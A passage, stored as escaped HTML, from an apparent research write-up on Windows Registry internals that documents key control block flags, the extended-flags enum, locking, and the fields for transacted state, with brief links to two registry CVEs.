class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Bit&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x008&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;SpareExtFlag&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Pos&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;20,&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1 tTszyzmaCA-c4&quot;&gt;Bit&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c1 tTszyzmaCA-c4&quot;&gt;[...]&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c1 tTszyzmaCA-c4&quot;&gt;&amp;nbsp; &amp;nbsp;+0x040 DelayedDeref &amp;nbsp; &amp;nbsp; : Pos 0, 1 Bit&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c1 tTszyzmaCA-c4&quot;&gt;&amp;nbsp; &amp;nbsp;+0x040 DelayedClose &amp;nbsp; &amp;nbsp; : Pos 1, 1 Bit&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c1 tTszyzmaCA-c4&quot;&gt;&amp;nbsp; &amp;nbsp;+0x040 Parking &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;: Pos 2, 1 Bit&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c23&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;br/&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span&gt;For the eight explicitly defined flags&lt;/span&gt;&lt;span&gt;, here&amp;#39;s a brief explanation:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0 tTszyzmaCA-c29&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_ab8mfzoog88u-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;Freed:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;the KCB has been freed, but the underlying pool allocation may still be alive as part of the CmpFreeKCBListHead (older systems) or CmpKcbLookaside (Windows 10 and 11) lookaside lists.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;Discarded:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;the KCB has been unlinked from the global KCB tree and is not available for name-based lookups, but there may still be active references to it via open handles. It is typically set for keys that have been deleted, and for old instances of keys that have been renamed.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;HiveUnloaded:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;the underlying hive has been unloaded.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;Decommissioned:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;the KCB is no longer used (its reference count dropped to zero) and it is ready to be freed, but it hasn&amp;#39;t been freed just yet.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;SpareExtFlag:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;as the name suggests, this is a spare bit that may be associated with a new flag in the future.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;DelayedDeref:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;the key is subject to a &amp;quot;delayed deref&amp;quot; mechanism, due to having been dereferenced using CmpDelayDerefKeyControlBlock instead of CmpDereferenceKeyControlBlock. This serves to defer the actual dereferencing of the KCB by some time, anticipating its near-future need and thus avoiding a redundant free-allocate sequence.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;DelayedClose:&lt;/span&gt;&lt;span&gt;&amp;nbsp;the key is subject to a &amp;quot;delayed close&amp;quot; mechanism, which is similar to &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c44&quot;&gt;delayed deref&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;, but it involves delaying the freeing of a KCB structure even if its refcount has dropped to zero.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;Parking:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;the purpose of this bit is unclear, and it seems to be currently unused.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;
 &lt;p class=&quot;tTszyzmaCA-c0 tTszyzmaCA-c29&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;Last but not least, the ExtFlags member stores a further set of flags, which can be expressed as the following enum:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c8&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c28&quot;&gt;enum&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;_CM_KCB_EXT_FLAGS&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;CM_KCB_NO_SUBKEY&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c19&quot;&gt;0x1&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;CM_KCB_SUBKEY_ONE&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c19&quot;&gt;0x2&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;CM_KCB_SUBKEY_HINT&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c19&quot;&gt;0x4&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;CM_KCB_SYM_LINK_FOUND &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c19&quot;&gt;0x8&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;CM_KCB_KEY_NON_EXIST&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c19&quot;&gt;0x10&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;CM_KCB_NO_DELAY_CLOSE&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c19&quot;&gt;0x20&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;CM_KCB_INVALID_CACHED_INFO&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c19&quot;&gt;0x40&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;CM_KCB_READ_ONLY_KEY&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c19&quot;&gt;0x80&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c4 tTszyzmaCA-c11&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;&amp;nbsp; CM_KCB_READ_ONLY_SUBKEY &amp;nbsp; &amp;nbsp;= &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c19&quot;&gt;0x100&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c4 tTszyzmaCA-c11&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;};&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c23&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;br/&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;Let&amp;#39;s break it down:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0 tTszyzmaCA-c29&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_pzr402xila08-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;CM_KCB_NO_SUBKEY&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;CM_KCB_SUBKEY_ONE&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;CM_KCB_SUBKEY_HINT:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;these flags are currently obsolete, and were originally related to an old performance optimization. CM_KCB_NO_SUBKEY indicated that the key had no subkeys. CM_KCB_SUBKEY_ONE indicated that the key had exactly one subkey, and its 32-bit hint value was stored in KCB.HashKey. Finally, CM_KCB_SUBKEY_HINT indicated that the hints of all subkeys were stored in a dynamically allocated buffer pointed to by KCB.IndexHint. According to my analysis, none of the flags seem to be used in modern versions of Windows, even though their related fields in the KCB structure still exist.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;CM_KCB_SYM_LINK_FOUND:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;indicates that the key is a symbolic link whose target KCB has already been resolved during a previous access, and is cached in KCB.CachedChildList.RealKcb (older systems) or KCB.LinkTarget (Windows 10 and 11). It is an optimization designed to speed up the process of traversing symlinks, by performing the path lookup only once and later referring directly to the cached KCB where possible.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;CM_KCB_KEY_NON_EXIST:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;this is another deprecated flag that existed in historical implementations of the registry, but doesn&amp;#39;t seem to be used anymore.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;CM_KCB_NO_DELAY_CLOSE:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;indicates that the key mustn&amp;#39;t be subject to the &amp;quot;delayed close&amp;quot; mechanism, and instead should be freed as soon as all references to it are dropped.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;CM_KCB_INVALID_CACHED_INFO:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;this flag simply indicates that the IndexHint/HashKey/SubKeyCount fields contain out-of-date information that shouldn&amp;#39;t be relied on.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;CM_KCB_READ_ONLY_KEY:&lt;/span&gt;&lt;span&gt;&amp;nbsp;t&lt;/span&gt;&lt;span&gt;his key is designated as read-only and, therefore, is not modifiable.&lt;/span&gt;&lt;span&gt;&amp;nbsp;The flag can be set by using the undocumented NtLockRegistryKey system call, which can only be called from kernel-mode. Shout out to James Forshaw who wrote an &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c22&quot;&gt;&lt;a href=&quot;https://www.tiraniddo.dev/2017/07/locking-your-registry-keys-for-fun-and.html&quot;&gt;interesting post&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;about it on his blog.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;CM_KCB_READ_ONLY_SUBKEY:&lt;/span&gt;&lt;span&gt;&amp;nbsp;t&lt;/span&gt;&lt;span&gt;he exact meaning and usage of the flag is unclear, but it appears to be enabled for keys with at least one descendant subkey marked as read-only.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Specifically, the internal CmLockKeyForWrite function (the main routine behind NtLockRegistryKey&amp;#39;s logic) sets it iteratively for every parent key of the read-only key, up to and including the hive&amp;#39;s root.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h4 class=&quot;tTszyzmaCA-c21 tTszyzmaCA-c13&quot; id=&quot;h.gsjfcfj1wp7t&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c4 tTszyzmaCA-c35&quot;&gt;Key body list&lt;/span&gt;&lt;/h4&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;To optimize access, the KCB stores the first four key body handles in the KeyBodyArray for fast, lockless access. The KeyBodyListHead field maintains the head of a doubly-linked list for any additional handles.&lt;/span&gt;&lt;/p&gt;&lt;h4 class=&quot;tTszyzmaCA-c21 tTszyzmaCA-c13&quot; id=&quot;h.fr34jzq08897&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c35 tTszyzmaCA-c4&quot;&gt;KCB lock&lt;/span&gt;&lt;/h4&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;The KcbPushlock member within the KCB structure is a lock used to synchronize access to the key during various registry system calls. This lock is passed to standard kernel pushlock APIs, such as ExAcquirePushLockSharedEx, ExAcquirePushLockExclusiveEx, and ExReleasePushLockEx&lt;/span&gt;&lt;/p&gt;&lt;h4 class=&quot;tTszyzmaCA-c21 tTszyzmaCA-c13&quot; id=&quot;h.fldcbm4uiycx&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c35 tTszyzmaCA-c4&quot;&gt;Transacted state&lt;/span&gt;&lt;/h4&gt;
 &lt;p class=&quot;tTszyzmaCA-c0 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;The key control block is central to managing the transacted state of registry keys, maintaining pending changes in memory before they are committed to the hive. Several fields within the KCB are specifically dedicated to this function:&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_4j4spo1gm828-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c10 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;KCBUoWListHead:&lt;/span&gt;&lt;span&gt;&amp;nbsp;This field is a list head that anchors a list of &lt;/span&gt;&lt;span&gt;Unit of Work (UoW) structures&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;. Each UoW represents a specific action taken within a transaction, such as creating, deleting a key or setting or deleting a value. This list allows the system to track all pending transactional operations related to a particular key, and it is crucial for ensuring atomicity, as it records the operations that must be applied or rolled back as a single unit.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c10 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;TransKCBOwner:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;This field is used to identify the transaction object that &amp;quot;owns&amp;quot; the key. It is set on the KCBs of transactionally created keys, and signifies that the key is currently only visible in the context of the specific transaction. Once the transaction commits, this field is cleared, and the key becomes visible in the global registry tree.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c10 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;KCBLock&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;KeyLock:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;Two so-called intent locks of type _CM_INTENT_LOCK, which are used to ensure that no two transactions can be associated with a single key if their respective operations could invalidate each other&amp;#39;s state. According to my understanding, KCBLock protects the consistency of the KCB in this regard, and KeyLock protects the key node. The !reg&amp;nbsp;ixlock WinDbg command is designed to display the internal state of these locks.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c10 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;TransValueCache:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;This field is a structure that caches value entries associated with a particular KCB, if at least one of its values has been modified in an active transaction. Before a value is set, modified or deleted within a transaction for the first time, a copy of the current value list is taken and stored here. When a transaction is committed, the TransValueCache state is applied back to the key&amp;#39;s persistent value list. On rollback, the list is simply discarded.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c10 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;TransValueListOwner:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;This field is a pointer to a transaction that currently &amp;quot;owns&amp;quot; the TransValueCache. At any given time, for each key, there may be at most one active transaction that has any pending operations involving the key&amp;#39;s values.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;
 &lt;p class=&quot;tTszyzmaCA-c0 tTszyzmaCA-c13&quot;&gt;&lt;span&gt;These fields collectively form the core transaction management within the Windows Registry. Ever since their introduction in Windows Vista, they need to be correctly handled as part of every registry action, be it a read/write one, a transacted/non-transacted one etc. This is because the kernel must potentially incorporate any transacted state in any information queries, and must similarly pay attention not to allow the existence of two contradictory transactions at the same time, and not to allow a non-transacted operation to break any assumptions of an active transaction without invalidating it first. And any bugs related to managing the transacted state may have significant security implications, with some interesting examples being &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c22&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451527&quot;&gt;CVE-2023-21748&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c22&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451531&quot;&gt;CVE-2023-23420&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. The specific structures used to store the transacted state, such as _CM_TRANS or _CM_KCB_UOW, are discussed in more detail in the &amp;quot;Transaction structures&amp;quot; section below.&lt;/span&gt;&lt;/p&gt;&lt;h4 class=&quot;tTszyzmaCA-c21 tTszyzmaCA-c13&quot; id=&quot;h.z8g2ccyfj4pv&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c35 tTszyzmaCA-c4&quot;&gt;Layered key state&lt;/span&gt;&lt;/h4&gt;
